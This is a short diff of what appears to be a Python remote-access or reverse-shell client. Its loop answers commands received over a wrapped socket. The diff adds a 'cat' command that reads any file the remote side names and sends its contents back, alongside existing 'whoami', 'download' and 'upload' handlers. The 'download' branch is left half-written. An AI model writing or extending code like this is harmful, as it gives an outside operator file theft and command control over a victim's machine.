@@ -72,7 +72,12 @@ try:
         elif cmd[0] == "whoami":
             output = os.environ.get('USERNAME')
             wrappedSocket.sendall(output.encode())
+        elif cmd[0] == "cat":
+            output = open(cmd[1], 'r')
+            output = output.read()
+            wrappedSocket.sendall(output.encode())
         elif cmd[0] == "download":
+            file = open(cmd[1], 'r')
             wrappedSocket.sendall(cmd[0].encode())
         elif cmd[0] == "upload":
             wrappedSocket.sendall(cmd[0].encode())
